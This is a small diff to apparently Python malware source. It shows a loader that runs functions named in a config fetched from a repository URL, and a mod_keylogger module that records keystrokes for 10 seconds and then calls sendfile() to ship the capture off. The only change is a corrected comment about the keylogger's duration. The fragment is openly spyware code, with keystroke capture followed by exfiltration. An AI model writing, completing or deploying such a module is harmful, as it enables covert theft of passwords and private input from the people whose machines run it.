@@ -38,7 +38,7 @@ def run_functions(repo_url: str, config_file: str):
             globals()[function_name]()
 
 def mod_keylogger():
-    # Keylogger duration is set to 60s:
+    # Keylogger duration is set to 10s:
     k = keylogger(duration=10)
     k.start()
     k.sendfile()
